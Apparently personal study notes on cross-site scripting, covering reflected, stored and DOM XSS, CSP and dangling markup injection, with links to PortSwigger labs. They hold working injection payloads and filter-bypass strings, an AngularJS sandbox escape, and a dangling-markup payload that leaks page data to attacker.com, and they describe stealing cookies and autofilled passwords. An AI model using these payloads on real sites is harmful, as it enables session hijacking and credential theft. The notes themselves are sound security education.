# Cross Site Scripting
![](https://github.com/DK9510/Img/blob/main/xss.png)
![[xss.png]]
## what is Cross site Scripting 
- it is web security vulnerability that allows an attacker to compromise the interactions that user have with a vulnerable application.
- it allow an attacker to masquerade as victim user, to carry any action that user is able to perform.

## Types of XSS 
- `Reflected XSS:` where the malicious scrip comes from the current HTTP request.
- `Stored XSS: ` where the malicious script comes from the website's database.
- `DOM-Based XSS:` where the vulnerability exists in the client-side code rather than server-side code.

# Reflected XSS
- it arise when an application receives data in an HTTP request and include data within the immediate response in an unsafe way.
```js
http://insecure.web/status?msg=hello.
```
```js
http://insecure.web/status?msg=<script>bad stuff </script>
```
[Ultimate XSS Cheetsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## impact of Reflected xss 
- perform any action within the application that the user can perform
- view any information that the user is able to view
- modify any information that the user is able to modify
- initiate interaction with other application users, including malicious attacks

# exploiting
- traditional way to prove that you've found XSS in to create popup using `alert()` function. but xss is not only popups
- xss can be leverage to higher criticality if we craft spacial payload that more harmfull.

## Exploiting XSS to steal COOKIES
#### limitation
- victim might not logged in
- many application hide their cookie from JS using `HttpOnly` flag
- sessions might be locked to additional factors like the user's IP address
- the Session might time out before you're able to hijack it.

we make xxs to request to our domain+with cookie `document.cookie` there is many ways this can be done

## EXploiting XSS to perform CSRF
it is depend on the application type and what a user can do, probably we do all that stuff with out user interaction using `jS`
## capture password
- some user use autofill password we take advantage of that feature and make xss trigger to auto fill the password in the attacker web and submit that to attacker web

# find and test for Reflected XSS
- **Test Every Entry Point:** test separately every entry point for data within the application's HTTP requests. This include parameter or other data within the URL query string and message body.
- Determine the Reflection context i.e where is our input reflected.
- test Candidate payload: using burp repeater we see if our payload work or not
- test alternative payload if the XSS payload was blocked or modified by the application.
- test the attack in a real browser and confirm it.

# XSS COntext
- the location where the response where the attacker control data appears.
- any input validation or other processing that is being performed on that data by application.

## XSS in HTML tag attributes
- When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:
```js
"><script>alert(document.domain)</script>"
```
- if angle brackets are blocked then we introduce new attributes that creates a scriptable context, such as event handler
```js
"autofocus onfocus=alert(document.domain) x="
```

- Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the `href` attribute of an anchor tag, you can use the `javascript` pseudo-protocol to execute script. For example:
```js
< a href="javascript:alert(document.domain)">
```

## Xss into Java script
- simply close the previous `<script>` tag and then enter our payload
```js
</script><img src=x onerror=alert(document.domain)>
```

## breaking out of a java script string
- in cases where the Xss context is inside a quoted string literal, it is often possible to break out of the string and execute java script directly. 
- it is essential to repair script following xss context, because any syntax errors there will prevent the whole script from executing.
```js
'-alert(document.domain)-'    or
';alert(document.domain)//
```

- Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash
-  backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator.
-  In this situation, applications often make the mistake of failing to escape the backslash character itself. This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.
```js
';alert(0)//   gets covers to \';alert(0)//
we use
\';alert(0)// which converted to \\';alert(0)//
here 1st '\'bypass 2 nd '\' from interpreting as special char
```

## making use of HTML Encoding
- when the XSS context is some existing javascript within quoted tag attribute, such as an event handler, it is possible to make use of `HTML Encoding` to work around some input filters.
- if sever-side application blocks or sanitize certain character that need for sucessfull XSS exploit, we bypass it using `HTML-Encoding` those characters.
```js
<a href="#" onclick="... var input='controble data here';...">
```
if application blocks or escape `Quote` character we use this 
```js
&apos;-alert(document.domain)-&apos;
```

## XSS in Java Script Template literals
- javascript template literals are string literals that allow embedded javascript expressions.
- the embedded expression are evaluated and are normally concatenated into the surrounding text. template literals are encapsulated in backticks instead of normal quotation ,marks.
- `${...}syntax`
- example following script will print whole msg that includes user's name
```js
document.getElementById('message').innerText=`Welcom, $(user.displayName).`;
```
 to exploit this jS template literal
 ```js
 <script>
 ...
 var input=`controllable data`;
 ...
 <script>
 <!-- we use payload like bellow to trigger XSS-->
 ${alert(document.domain)}
 ```
 
 ## Xss in the Context of the angular JS sandbox
 ```js
 1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 ```
 
 # Stored XSS
 - also known as second order Xss 
 - arise when an application receives data from an untrusted source and includes that data within its late HTTP response in an unsafe way
 example
 ```js
 <p>hello, tnis is my message </p>
 exploit
 <p><script>js script </script></p>
 ```
 
 ## find and test for Stored XSS
 - parameter or other data within the URL query string and message body
 - The URL path
 - http header that might not be exploitable in relation to reflected xss
 - Data that is currently stored by the application is often vulnerable to being overwritten due to other actions performed within the application. For example, a search function might display a list of recent searches, which are quickly replaced as users perform other searches

# DOM-based XSS
- DOM-based XSS (also known as DOM XSS) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.
## Which sinks can lead to DOM-XSS vulnerabilities?

The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

`document.write()  
document.writeln()  
document.domain  
someDOMElement.innerHTML  
someDOMElement.outerHTML  
someDOMElement.insertAdjacentHTML  
someDOMElement.onevent  
`

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

`add()  
after()  
append()  
animate()  
insertAfter()  
insertBefore()  
before()  
html()  
prepend()  
replaceAll()  
replaceWith()  
wrap()  
wrapInner()  
wrapAll()  
has()  
constructor()  
init()  
index()  
jQuery.parseHTML()  
$.parseHTML()`

# COntent Security Policy
## what is CSP
- CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. 
- it works by restricting the resources(i.e scripts and images)
- TO enable `CSP` a response needs to include HTTP response header called `Contet-Security-Policy` with value containing the policy. the policy consists of one or more directive, separated by semicolons.

## mitigating XSS attack using CSP
`CSRF+ XSS` example:
[lab scenario](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack)


# Dangling Markup Injection
## what is Dangling Markup Injection
- it is a technique for capturing data cross-domain in situation where a full XSS attack isn't possible.
- if normal Xss isn't possible due to input filters or CSP or other Obstacles here it might still be possible to deliver a `dangling markup injection` attack using a payload like the following
```js
"><img src='//attacker.com?
```
This payload creates an `img` tag and defines the start of a `src` attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the `src` attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded.
- The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.
`Example labs `
[lab1](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
[lab2](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack)

# [prevention](https://portswigger.net/web-security/cross-site-scripting/preventing)



